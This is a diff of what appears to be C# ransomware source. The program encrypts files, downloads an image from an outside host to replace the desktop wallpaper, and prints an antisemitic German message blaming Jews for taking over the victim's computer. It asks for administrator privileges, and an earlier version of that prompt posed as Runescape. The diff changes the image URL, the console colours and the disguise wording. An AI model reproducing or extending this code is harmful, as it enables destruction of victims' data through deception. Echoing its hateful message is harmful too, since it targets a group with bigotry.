@@ -281,12 +281,13 @@ namespace Program
                 Critical();
                 Thread.Sleep(200);
                 EncryptFile(); // Calls the file encryption function
-                new WebClient().DownloadFile("https://i.imgur.com/wAvU1Km.jpg", @"c:\wAvU1Km.jpg"); // Downloads the picture we want as wallpaper and places it in the c:\ directory
+                new WebClient().DownloadFile("https://i.imgur.com/DGGAlq4.jpg", @"c:\DGGAlq4.jpg"); // Downloads the picture we want as wallpaper and places it in the c:\ directory
                 Thread.Sleep(2000);
                 Console.Clear();
-                SystemParametersInfo(SPI_SETDESKWALLPAPER, 1, @"c:\wAvU1Km.jpg", SPIF_UPDATEINIFILE); // Sets the wallpaper to our desired photo
+                SystemParametersInfo(SPI_SETDESKWALLPAPER, 1, @"c:\DGGAlq4.jpg", SPIF_UPDATEINIFILE); // Sets the wallpaper to our desired photo
 
                 Console.ForegroundColor = ConsoleColor.Green;
+                Console.BackgroundColor = ConsoleColor.Darkgray;
                 string text = "Achtung! Du hast einen großen Fehler gemacht! Die juden hat deinen Computer übernommen.";
                 foreach (char c in text)
                 {
@@ -308,9 +309,12 @@ namespace Program
             else // If the program was not run as an administrator
             {
                 Console.ForegroundColor = ConsoleColor.Yellow;
-                Console.WriteLine("Runescape requires administrator privileges. Please restart this application in administrator mode to continue.");
+                Console.BackgroundColor = ConsoleColor.Darkgray;
+                Console.WriteLine("This application requires administrator privileges. Please restart the application in administrator mode to continue.");
                 Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Yellow;
                 Console.WriteLine("Press enter to close this window...");
+                Console.ResetColor();
                 Console.ReadLine();
             }
         }
